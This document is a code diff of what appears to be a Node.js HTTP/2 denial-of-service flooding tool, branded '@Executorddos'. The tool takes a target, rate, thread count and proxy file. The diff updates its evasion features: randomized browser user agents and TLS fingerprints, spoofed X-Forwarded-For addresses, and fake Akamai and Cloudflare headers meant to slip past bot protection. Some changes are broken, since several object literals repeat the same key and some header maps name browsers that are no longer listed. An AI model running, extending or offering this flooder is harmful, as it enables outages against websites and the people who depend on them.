@@ -5,7 +5,7 @@ const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const dns = require('dns');
-const fetch = require('node-fetch-commonjs');
+const fetch = require('node-fetch');
 const util = require('util');
 const socks = require('socks').SocksClient;
 const crypto = require("crypto");
@@ -35,10 +35,12 @@ const urihost = [
     'facebook.com',
     'baidu.com',
     'wikipedia.org',
-    'twitter.com',
+    'x.com',
     'amazon.com',
     'yahoo.com',
     'reddit.com',
+    'bing.com',
+    'duckduckgo.com',
     'netflix.com'
 ];
 clength = urihost[Math.floor(Math.random() * urihost.length)]
@@ -96,10 +98,10 @@ function randomIntn(min, max) {
   }
     const cplist = [
        "TLS_AES_128_CCM_8_SHA256",
-  "TLS_AES_128_CCM_SHA256",
-  "TLS_CHACHA20_POLY1305_SHA256",
-  "TLS_AES_256_GCM_SHA384",
-  "TLS_AES_128_GCM_SHA256"
+       "TLS_AES_128_CCM_SHA256",
+       "TLS_CHACHA20_POLY1305_SHA256",
+       "TLS_AES_256_GCM_SHA384",
+       "TLS_AES_128_GCM_SHA256"
  ];
  var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
  ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
@@ -113,13 +115,13 @@ process.on('uncaughtException', function(e) {
  require("events").EventEmitter.defaultMaxListeners = 0;
  const sigalgs = [
      "ecdsa_secp256r1_sha256",
-          "rsa_pss_rsae_sha256",
-          "rsa_pkcs1_sha256",
-          "ecdsa_secp384r1_sha384",
-          "rsa_pss_rsae_sha384",
-          "rsa_pkcs1_sha384",
-          "rsa_pss_rsae_sha512",
-          "rsa_pkcs1_sha512"
+     "rsa_pss_rsae_sha256",
+     "rsa_pkcs1_sha256",
+     "ecdsa_secp384r1_sha384",
+     "rsa_pss_rsae_sha384",
+     "rsa_pkcs1_sha384",
+     "rsa_pss_rsae_sha512",
+     "rsa_pkcs1_sha512"
 ] 
   let SignalsList = sigalgs.join(':')
 const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
@@ -262,18 +264,20 @@ const RESTART_DELAY = 1000;
 function getRandomHeapSize() {
     // Random t? 512MB d?n 2048MB
     const min = 1000;
-    const max = 5222;
+    const max = 6222;
     return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 if (cluster.isMaster) {
     console.clear();
+    console.log(`@Executorddos`.bgRed), console.log(`[!] Mrcyber`);
     console.log(`--------------------------------------------`.gray);
-    console.log(`Target: `.blue + process.argv[2].white);
-    console.log(`Time: `.blue + process.argv[3].white);
-    console.log(`Rate: `.blue + process.argv[4].white);
-    console.log(`Thread: `.blue + process.argv[5].white);
-    console.log(`ProxyFile: `.blue + process.argv[6].white);
+    console.log(`Target: `.red + process.argv[2].white);
+    console.log(`Time: `.red + process.argv[3].white);
+    console.log(`Rate: `.red + process.argv[4].white);
+    console.log(`Thread: `.red + process.argv[5].white);
+    console.log(`ProxyFile: `.red + process.argv[6].white);
     console.log(`--------------------------------------------`.gray);
+    console.log(`Note: Only work on http/2 or http/1.1 `.brightCyan);
 
     const restartScript = () => {
         for (const id in cluster.workers) {
@@ -341,7 +345,7 @@ function taoDoiTuongNgauNhien() {
   
     return doiTuong;
   }
-const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx"];
+const browsers = ["chrome", "safari", "firefox", "edge", "opera"];
 const getRandomBrowser = () => {
     const randomIndex = Math.floor(Math.random() * browsers.length);
     return browsers[randomIndex];
@@ -349,23 +353,21 @@ const getRandomBrowser = () => {
 const generateHeaders = (browser) => {
     const versions = {
         chrome: { min: 115, max: 124 },
-        safari: { min: 14, max: 16 },
-        brave: { min: 115, max: 124 },
+        safari: { min: 12, max: 16 },
         firefox: { min: 99, max: 112 },
-        mobile: { min: 85, max: 105 },
-        opera: { min: 70, max: 90 },
-        operagx: { min: 70, max: 90 }
+        edge: { min: 109, max: 115 },
+        opera: { min: 70, max: 90 }
     };
 
     const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;
     const fullVersions = {
-        brave: "90.0.4430.212",
-        chrome: "90.0.4430.212",
-        firefox: "88.0",
-        safari: "14.1",
-        mobile: "90.0.4430.212",
-        opera: "90.0.4430.212",
-        operagx: "90.0.4430.212"
+        brave: "1.75.121",
+        chrome: "119.0.6011.101",
+        firefox: "134.0",
+        safari: "17.5",
+        mobile: "127.0.6901.105",
+        opera: "115.0.5790.168",
+        operagx: "115.0.5790.184"
     };
 
     // T?o header "Sec-CH-UA-Full-Version-List" t? gi? tr? full version
@@ -374,191 +376,168 @@ const generateHeaders = (browser) => {
         .join(", ");
     const platforms = {
         chrome: "Win64",
+        chrome: "macOS",
+        chrome: "Mobile",
+        chrome: "Linux",
+        safari: "Win64",
         safari: "macOS",
-        brave: "Linux",
+        safari: "Mobile",
+        safari: "Linux",
+        firefox: "Win64",
+        firefox: "macOS",
+        firefox: "Mobile",
         firefox: "Linux",
-        mobile: "Android",
-        opera: "Linux",
-        operagx: "Linux"
+        edge: "Win64",
+        edge: "macOS",
+        edge: "Mobile",
+        edge: "Linux",
+        opera: "Win64",
+        opera: "macOS",
+        opera: "Mobile",
+        opera: "Linux"
     };
     const platform = platforms[browser];
 
     const userAgent = {
         chrome: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
+        chrome: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${version}_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
+        chrome: `Mozilla/5.0 (iPhone; CPU iPhone OS 10_${version}_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36`,
+        chrome: `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
         safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${version}_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version}.0 Safari/605.1.15`,
-        brave: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
+        safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${version}_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version}.0 Safari/605.1.15`,
+        safari: `Mozilla/5.0 (iPhone; CPU iPhone OS 10_${version}_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/${version}.0 Mobile Safari/602.1`,
+        safari: `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Version/${version}.0 Safari/537.36`,
         firefox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${version}.0) Gecko/20100101 Firefox/${version}.0`,
-        mobile: `Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36`,
-        opera: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
-        operagx: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`
-    };
-    const secFetchUser = Math.random() < 0.75 ? "?1;?1" : "?1";
-const secChUaMobile = browser === "mobile" ? "?1" : "?0";
-const acceptEncoding = Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br";
-const accept = Math.random() < 0.5 
-  ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
-  : "application/json";
-  
-const secChUaPlatform = Math.random() < 0.5 ? '"Windows"' : '"Linux"';
-const secChUaFull = Math.random() < 0.5 ? '"Google Chrome";v="118", "Chromium";v="118"' : '"Mozilla Firefox";v="118"';
-const secFetchDest = Math.random() < 0.5 ? "document" : "image";
-const secFetchMode = Math.random() < 0.5 ? "navigate" : "cors";
-const secFetchSite = Math.random() < 0.5 ? "same-origin" : "cross-site";
-
-const acceptLanguage = Math.random() < 0.5 
-  ? "en-US,en;q=0.9" 
-  : Math.random() < 0.5 
-  ? "en-GB,en;q=0.9" 
-  : "es-ES,es;q=0.8,en;q=0.7";
-
-const acceptCharset = Math.random() < 0.5 ? "UTF-8" : "ISO-8859-1";
-
-const connection = Math.random() < 0.5 ? "keep-alive" : "close";
-
-const xRequestedWith = Math.random() < 0.5 ? "XMLHttpRequest" : "Fetch";
-
-const referer = Math.random() < 0.5 
-  ? "https://www.google.com" 
-  : "https://www.bing.com";
-  
-const xForwardedFor = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
-
-const te = Math.random() < 0.5 ? "trailers" : "gzip";
-
-const cacheControl = Math.random() < 0.5 ? "no-cache" : "max-age=3600";
-    const headersMap = {
-  brave: {
-    ":method": "GET",
-    ":authority": Math.random() < 0.5 
-      ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
-      : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
-    ":scheme": "https",
-    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
-    "sec-ch-ua": `"Chromium";v="${Math.floor(100 + Math.random() * 20)}", "Google Chrome";v="${Math.floor(100 + Math.random() * 20)}", "Not-A.Brand";v="99"`,
-    "sec-ch-ua-mobile": `${Math.random() < 0.5 ? "?1" : "?0"}`,
-    "accept": Math.random() < 0.5 
-      ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
-      : "application/json",
-    "pragma": "no-cache",
-    "user-agent": userAgent.brave,
-    "sec-fetch-user": Math.random() < 0.5 ? "?1;?1" : "?0",
-    "accept-encoding": Math.random() < 0.5 
-      ? "gzip, deflate, br, zstd" 
-      : "gzip, deflate, br",
-    "accept-language": Math.random() < 0.5 
-      ? "en-US,en;q=0.9" 
-      : "ru-RU,ru;q=0.8",
-    "sec-ch-ua-platform": Math.random() < 0.5 ? '"Windows"' : '"Linux"',
-    "sec-ch-ua-platform-version": Math.random() < 0.5 
-      ? "10.0.0" 
-      : "15.2.0",
-    "sec-fetch-dest": Math.random() < 0.5 ? "document" : "image",
-    "sec-fetch-mode": Math.random() < 0.5 ? "navigate" : "cors",
-    "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
-    "referer": Math.random() < 0.5 
-      ? "https://www.google.com" 
-      : "https://www.youtube.com",
-    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
-    "cache-control": Math.random() < 0.5 ? "no-cache" : "max-age=0",
-    "dnt": Math.random() < 0.5 ? "1" : "0",
-    "connection": Math.random() < 0.5 ? "keep-alive" : "close",
-    "x-requested-with": Math.random() < 0.5 ? "XMLHttpRequest" : "com.android.browser",
-    "authorization": `Bearer ${generateRandomString(16, 32)}`,
-    "content-type": Math.random() < 0.5 
-      ? "application/json" 
-      : "text/html;charset=UTF-8",
-    "origin": Math.random() < 0.5 
-      ? "https://www.google.com" 
-      : "https://www.facebook.com",
-    "referrer-policy": Math.random() < 0.5 
-      ? "strict-origin-when-cross-origin" 
-      : "no-referrer",
-    "etag": `W/"${generateRandomString(13, 20)}"`,
-    "if-none-match": Math.random() < 0.5 
-      ? `W/"${generateRandomString(13, 20)}"` 
-      : null,
-    "Sec-CH-UA-Full-Version-List": `"Google Chrome";v="${Math.floor(100 + Math.random() * 20)}", "Chromium";v="${Math.floor(100 + Math.random() * 20)}"`
-  },
-  firefox: {
-    ":method": "GET",
-    ":authority": Math.random() < 0.5 
-      ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
-      : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
-    ":scheme": "https",
-    ":path": parsedTarget.path,
-    "sec-ch-ua": `"Firefox";v="${Math.floor(100 + Math.random() * 20)}", "Gecko";v="20100101", "Mozilla";v="5.0"`,
-    "sec-ch-ua-mobile": "?0",
-    "accept": `${Math.random() < 0.5 
-      ? "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
-      : "application/json"}`,
-    "user-agent": userAgent.firefox,
-    "accept-language": "en-US,en;q=0.9",
-    "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate",
-    "referer": "https://www.mozilla.org/",
-    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
-    "cache-control": "max-age=0",
-    "sec-fetch-dest": "document",
-    "sec-fetch-mode": "navigate",
-    "sec-fetch-site": "same-origin"
-  },
-  safari: {
-    ":method": "GET",
-    ":authority": Math.random() < 0.5 
-      ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
-      : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
-    ":scheme": "https",
-    ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
-    "sec-ch-ua": `"Safari";v="16.0", "AppleWebKit";v="605.1.15", "Not-A.Brand";v="99"`,
-    "sec-ch-ua-mobile": "?0",
-    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-    "user-agent": userAgent.safari,
-    "accept-language": "en-US,en;q=0.9",
-    "accept-encoding": "gzip, deflate, br",
-    "referer": "https://www.apple.com/",
-    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
-    "sec-fetch-dest": "document",
-    "sec-fetch-mode": "navigate",
-    "sec-fetch-site": "same-origin"
-  },
-  opera: {
-    ":method": "GET",
-    ":authority": Math.random() < 0.5 
-      ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
-      : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
-    ":scheme": "https",
-    ":path": parsedTarget.path,
-    "sec-ch-ua": `"Opera";v="${Math.floor(100 + Math.random() * 20)}", "Chromium";v="${Math.floor(100 + Math.random() * 20)}", "Not-A.Brand";v="99"`,
-    "sec-ch-ua-mobile": "?0",
-    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-    "user-agent": userAgent.opera,
-    "accept-language": "en-US,en;q=0.9",
-    "accept-encoding": "gzip, deflate, br",
-    "referer": "https://www.opera.com/",
-    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
-    "sec-fetch-dest": "document",
-    "sec-fetch-mode": "navigate",
-    "sec-fetch-site": "same-origin"
-  },
-  operagx: {
-    ":method": "GET",
-    ":authority": Math.random() < 0.5 
-      ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
-      : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
-    ":scheme": "https",
-    ":path": parsedTarget.path,
-    "sec-ch-ua": `"Opera GX";v="${Math.floor(100 + Math.random() * 20)}", "Chromium";v="${Math.floor(100 + Math.random() * 20)}", "Not-A.Brand";v="99"`,
-    "sec-ch-ua-mobile": "?0",
-    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-    "user-agent": userAgent.operagx,
-    "accept-language": "en-US,en;q=0.9",
-    "accept-encoding": "gzip, deflate, br",
-    "referer": "https://www.opera.com/gx",
-    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
-    "sec-fetch-dest": "document",
-    "sec-fetch-mode": "navigate",
-    "sec-fetch-site": "same-origin"
-  }
+        firefox: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${version}_0; rv:${version}.0) Gecko/20100101 Firefox/${version}.0`,
+        firefox: `Mozilla/5.0 (iPhone; CPU iPhone OS 10_${version}_0 like Mac OS X; rv:${version}.0) Gecko/20100101 Firefox/${version}.0 Mobile`,
+        firefox: `Mozilla/5.0 (X11; Linux x86_64; rv:${version}.0) Gecko/20100101 Firefox/${version}.0`,
+        edge: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 Edg/${version}.0`,
+        edge: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${version}_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 Edg/${version}.0`,
+        edge: `Mozilla/5.0 (iPhone; CPU iPhone OS 10_${version}_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36 Edg/${version}.0`,
+        edge: `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 Edg/${version}.0`,
+        opera: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 OPR/${version}.0`,
+        opera: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${version}_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 OPR/${version}.0`,
+        opera: `Mozilla/5.0 (iPhone; CPU iPhone OS 10_${version}_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36 OPR/${version}.0`,
+        opera: `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 OPR/${version}.0`
 };
+    const secFetchUser = Math.random() <0.75 ?"?1;?1":"?1";
+    const secChUaMobile = browser === "mobile" ? "?1" : "?0";
+    const acceptEncoding = Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br";
+    const accept = Math.random() < 0.5 ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" : "application/json";
+    const headersMap = {
+        brave: {
+            ":method": "GET",
+            ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
+            ":scheme": "https",
+            ":path": parsedTarget.path,
+            "sec-ch-ua": `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
+            "sec-ch-ua-mobile": `${secChUaMobile}`,
+            "accept": `${accept}, image/webp,image/apng,image/*,*/*;q=0.8, application/javascript, text/css, application/json, application/font-woff2, application/font-woff`,
+            "Pragma": "no-cache",
+            "user-agent": userAgent.brave,
+            "sec-fetch-user":  `${secFetchUser}`,
+            "accept-encoding": `${acceptEncoding}`,
+            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
+            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.brave,
+            "Alt-Svc": 'h2=":443"; ma=3600'
+        },
+        chrome: {
+            ":method": "GET",
+            ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
+            ":scheme": "https",
+            ":path": parsedTarget.path,
+            "sec-ch-ua": `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
+            "sec-ch-ua-mobile": `${secChUaMobile}`,
+            "accept": `${accept}, image/webp,image/apng,image/*,*/*;q=0.8, application/javascript, text/css, application/json, application/font-woff2, application/font-woff`,
+            "Pragma": "no-cache",
+            "user-agent": userAgent.chrome,
+            "sec-fetch-user":  `${secFetchUser}`,
+            "accept-encoding": `${acceptEncoding}`,
+            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
+            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.chrome,
+            "Alt-Svc": 'h2=":443"; ma=3600'
+        },
+        firefox: {
+            ":method": "GET",
+            ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
+            ":scheme": "https",
+            ":path": parsedTarget.path,
+            "sec-ch-ua": `"Firefox";v="${version}", "Gecko";v="20100101", "Mozilla";v="${version}"`,
+            "sec-ch-ua-mobile": `${secChUaMobile}`,
+            "accept": `${accept}, image/webp,image/apng,image/*,*/*;q=0.8, application/javascript, text/css, application/json, application/font-woff2, application/font-woff`,
+            "Pragma": "no-cache",
+            "user-agent": userAgent.firefox,
+            "sec-fetch-user":  `${secFetchUser}`,
+            "accept-encoding": `${acceptEncoding}`,
+            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
+            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.firefox,
+            "Alt-Svc": 'h2=":443"; ma=3600'
+        },
+        safari: {
+            ":method": "GET",
+            ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
+            ":scheme": "https",
+            ":path": parsedTarget.path,
+            "sec-ch-ua": `"Safari";v="${version}", "AppleWebKit";v="605.1.15", "Not-A.Brand";v="99"`,
+            "sec-ch-ua-mobile": `${secChUaMobile}`,
+            "accept": `${accept}, image/webp,image/apng,image/*,*/*;q=0.8, application/javascript, text/css, application/json, application/font-woff2, application/font-woff`,
+            "Pragma": "no-cache",
+            "user-agent": userAgent.safari,
+            "sec-fetch-user":  `${secFetchUser}`,
+            "accept-encoding": `${acceptEncoding}`,
+            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
+            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.safari,
+            "Alt-Svc": 'h2=":443"; ma=3600'
+        },
+        mobile: {
+            ":method": "GET",
+            ":authority": Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
+            ":scheme": "https",
+           ":path": parsedTarget.path,
+            "sec-ch-ua": `"Chromium";v="${version}", "Mobile";v="${version}", "Not-A.Brand";v="99"`,
+            "sec-ch-ua-mobile": `${secChUaMobile}`,
+            "accept": `${accept}, image/webp,image/apng,image/*,*/*;q=0.8, application/javascript, text/css, application/json, application/font-woff2, application/font-woff`,
+            "Pragma": "no-cache",
+            "user-agent": userAgent.mobile,
+            "sec-fetch-user":  `${secFetchUser}`,
+            "accept-encoding": `${acceptEncoding}`,
+            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
+            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.mobile,
+            "Alt-Svc": 'h2=":443"; ma=3600'
+        },
+        opera: {
+            ":method": "GET",
+            ":authority":Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
+            ":scheme": "https",
+            ":path": parsedTarget.path,
+            "sec-ch-ua": `"Chromium";v="${version}", "Opera";v="${version}", "Not-A.Brand";v="99"`,
+            "sec-ch-ua-mobile": `${secChUaMobile}`,
+            "accept": `${accept}, image/webp,image/apng,image/*,*/*;q=0.8, application/javascript, text/css, application/json, application/font-woff2, application/font-woff`,
+            "Pragma": "no-cache",
+            "user-agent": userAgent.operagx,
+            "sec-fetch-user":  `${secFetchUser}`,
+            "accept-encoding": `${acceptEncoding}`,
+            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
+            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.opera,
+            "Alt-Svc": 'h2=":443"; ma=3600'
+        },
+        operagx: {
+            ":method": "GET",
+            ":authority":Math.random() < 0.5 ? parsedTarget.host + (Math.random() < 0.5 ? '.' : '') : ('www.'+ parsedTarget.host + (Math.random() < 0.5 ? '.' : '')),
+            ":scheme": "https",
+            ":path": parsedTarget.path,
+            "sec-ch-ua": `"Chromium";v="${version}", "Opera GX";v="${version}", "Not-A.Brand";v="99"`,
+            "sec-ch-ua-mobile": `${secChUaMobile}`,
+            "accept": `${accept}, image/webp,image/apng,image/*,*/*;q=0.8, application/javascript, text/css, application/json, application/font-woff2, application/font-woff`,
+            "Pragma": "no-cache",
+            "user-agent": userAgent.operagx,
+            "sec-fetch-user":  `${secFetchUser}`,
+            "accept-encoding": `${acceptEncoding}`,
+            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
+            "Sec-CH-UA-Full-Version-List": secChUAFullVersionList.operagx,
+            "Alt-Svc": 'h2=":443"; ma=3600'
+        }
+    };
 
     return headersMap[browser];
 };
@@ -569,30 +548,68 @@ function getWeightedRandom() {
     return randomValue < 0.25;
 }
 const randomString = randstr(10);
-
+const rateHeaders1 = [
+{"X-Forwarded-For": parsedProxy[0] },
+{"source-ip" : randstr(5)},
+{"Vary" : randstr(5)},
+{"Attribution-Reporting-Eligible" : "trigger"},
+];
+const rateHeaders2 = [
+{ "TTL-3": "1.5" },
+{"From-Unknown-Botnet" : "Cloudflare"},
+];
+const rateHeaders3 = [
+{ "A-IM": "Feed" },
+{"dnt" : 1},
+{"content-security-policy-report-only": "report-uri https://reporting.go-mpulse.net/report/FDSGP-LEB9B-T8Y2A-5V5ED-9WX2T"},
+];
+const rateHeaders4 = [
+{"Service-Worker-Navigation-Preload" : "true"},
+{"Supports-Loading-Mode" : "credentialed-prerender"},
+{ "pragma": "no-cache" },
+{ "data-return" : "false"},
+];
+		const rhd = [
+			{'RTT': Math.floor(Math.random() * (400 - 600 + 1)) + 100},
+      {"X-Forwarded-Proto": "https"},
+			{'Nel': '{ "report_to": "name_of_reporting_group", "max_age": 12345, "include_subdomains": false, "success_fraction": 0.0, "failure_fraction": 1.0 }'},
+		]
+		const hd1 = [
+			{'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none'},
+      {'Delta-Base' : '12340001'},
+       {"te": "trailers"},
+		]
                         const headers4 = {
-                            ...(getWeightedRandom() && Math.random() < 0.4 && { 'x-forwarded-for': `${randomString}:${randomString}` }),
+                        ...(Math.random() < 0.5 ?{"akamai-grn": "0.14965468.1718719936.1009b53"} : {} ),
+                        
+                             ...(Math.random() < 0.5 ?{"x-akam-sw-version": "0.5.0"} : {} ),
+                        ...(Math.random() < 0.5 ?{"x-akamai-transformed": "9 - 0 pmb=mNONE,1mTOE,1mRUM,4"} : {} ),
+                        ...(getWeightedRandom() && Math.random() < 0.4 && { 'x-forwarded-for': `${randomString}:${randomString}` }),
                             ...(Math.random() < 0.75 ?{"referer": "https:/" +clength} :{}),
                             ...(Math.random() < 0.75 ?{"origin": Math.random() < 0.5 ? "https://" + clength + (Math.random() < 0.5 ? ":" + randnum(4) + '/' : '@root/'): "https://"+ (Math.random() < 0.5 ?'root-admin.': 'root-root.') +clength}:{}),
                         }
 
                         let allHeaders = Object.assign({}, headers, headers4);
                         dyn = {
+                            ...(Math.random() < 0.5 ?{"cf-mitigated": "challenge"} : {} ),
+                            ...(Math.random() < 0.5 ?{"origin-agent-cluster": "?1"} : {} ),
+                            ...(Math.random() < 0.5 ? {"Observe-Browsing-Topics" : "?1"} : {}),
+                        ...(Math.random() < 0.5 ?{['client-x-with-'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)} : {}),
 	...(Math.random() < 0.5 ?{['cf-sec-with-from-'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)} : {}),
  ...(Math.random() < 0.5 ?{['user-x-with-'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)} : {}),			  
